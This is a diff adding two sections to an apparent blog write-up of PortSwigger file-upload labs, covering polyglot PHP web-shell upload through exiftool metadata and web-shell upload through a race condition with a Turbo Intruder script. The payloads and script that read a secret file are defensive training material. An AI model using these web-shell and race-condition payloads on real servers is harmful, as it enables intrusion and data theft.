@@ -219,6 +219,114 @@ I submit the string into the solution box in the web browser and the lab is mark
 
 ---
 
+*Remote Code Execution Via Polyglot Web Shell Upload* 
+
+![lab6 intro](/docs/assets/images/portswigger/fileupload/fu52.png)
+
+I start this lab off by logging in with the provided credentials `wiener:peter` and attempting to upload my `testploit.php` file. The server responds with an error message `Error: file is not a valid image Sorry, there was an error uploading your file`. 
+
+![login and upload file](/docs/assets/images/portswigger/fileupload/fu53.png)
+
+![error message](/docs/assets/images/portswigger/fileupload/fu54.png)
+
+I can use `exiftool` to add a comment containing the php script in my `testploit.php` file into an image files meta data. So when the server validates the file on upload it will determine that it's a real image, but when the server fetches the file in the `GET` request later it will execute the code in the comment.  
+
+`exiftool –Comment="<?php echo 'START' . file_get_contets('/home/carlos/secret') . ' END'; ?>" cookieploit.jpeg -o polyglot.php` 
+
+![exiftool](/docs/assets/images/portswigger/fileupload/fu55.png)
+
+When I try to upload this new `polyglot.php` file I can observe from the servers response that it was a success.
+
+![my account avatar success](/docs/assets/images/portswigger/fileupload/fu56.png)
+
+If I reload the `My Account` page the server will automatically generate a `GET /files/avatars/polyglot.php` request. Within its response there is a lot of noise, but I can see the `START` and `END` points of my scripts output, which should be the contents of `/home/carlos/secret`, `baWKLqisOpb0DFAO8TFsOxFjwyExUNZV`. 
+
+![get secret code](/docs/assets/images/portswigger/fileupload/fu57.png)
+
+I enter the string into the submission box in the web browser and the lab is marked as solved. 
+
+![lab6 solved](/docs/assets/images/portswigger/fileupload/fu58.png)
+
+---
+
+*Web Shell Upload Via Race Condition* 
+
+![lab7 intro](/docs/assets/images/portswigger/fileupload/fu59.png)
+
+Again to start this lab off I login with credentials `wiener:peter` and try to upload my `testploit.php` file. 
+
+![login and upload file](/docs/assets/images/portswigger/fileupload/fu60.png)
+
+The server responds with an error `Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file`. I'm going to forward this `POST /my-account/avatar` request to a burp extension called `Turbo Intruder`. 
+
+![post my account avatar](/docs/assets/images/portswigger/fileupload/fu61.png)
+
+![send to turbo intruder](/docs/assets/images/portswigger/fileupload/fu62.png)
+
+I'll also need to upload an image that actually gets accepted by the server, so that it will generate a request to the `GET /files/avatars/<filename>` when I refresh the `My Account` page. I'll use this request as part of my payload in the `Turbo Intruder`. 
+
+![upload actual image](/docs/assets/images/portswigger/fileupload/fu63.png)
+
+The default code within the `Turbo Intruder` should be replaced with the following python script: 
+
+``` 
+def queueRequests(target, wordlists): 
+
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,) 
+  
+    request1 = '''<YOUR-POST-REQUEST>''' 
+  
+    request2 = '''<YOUR-GET-REQUEST>''' 
+ 
+
+    # the 'gate' argument blocks the final byte of each request until openGate is invoked 
+    engine.queue(request1, gate='race1') 
+    for x in range(5): 
+        engine.queue(request2, gate='race1') 
+
+    # wait until every 'race1' tagged request is ready 
+
+ # then send the final byte of each request 
+
+    # (this method is non-blocking, just like queue) 
+
+    engine.openGate('race1') 
+
+    engine.complete(timeout=60) 
+
+  
+def handleResponse(req, interesting): 
+
+    table.add(req) 
+``` 
+
+![python script in turbo intruder](/docs/assets/images/portswigger/fileupload/fu64.png)
+
+I then copy the entire contents of the `POST /my account/avatar` request and paste it into the `request1` section of the python script. It is important to note that an extra space should be added at the end of the request. 
+
+![copy POST /my account/avatar](/docs/assets/images/portswigger/fileupload/fu65.png)
+
+I will then copy the entire contents of the `GET /files/avatars/<image_filename>` request I generated earlier and paste it into the `request2` section of my `Turbo Intruder` python script. 
+
+![copy 2nd request](/docs/assets/images/portswigger/fileupload/fu66.png)
+
+I will then change the filename of `request2` to to match the `testploit.php` file that I am attempting to upload in `request1`. Since this is a `GET` request it's important to add 2 spaces at the end of the request in the `Turbo Intruder`. 
+
+![edit request 2](/docs/assets/images/portswigger/fileupload/fu67.png)
+
+When I click attack the `Turbo Intruder` will attempt to upload my `testploit.php` file, it will then immediately send 5 requests that attempt to fetch the file in the time between it being uploaded to the server and the file being sanitized and deleted due to its file type. 
+
+I had to run the attack a couple of time but eventually one of the `GET` requests happens in the window of the `race condition` vulnerability and I get a 200 response with the contents of `home/carlos/secret`, `pzGlDoXLZndohnIWtgLrhFIRxev17U9E`. 
+
+![200 response with secret](/docs/assets/images/portswigger/fileupload/fu68.png)
+
+I submit the string in the submissions box in the web browser and the lab is marked as solved. 
+
+![submit string](/docs/assets/images/portswigger/fileupload/fu69.png)
+
+![lab7 solved](/docs/assets/images/portswigger/fileupload/fu70.png)
+
+
 
 
 
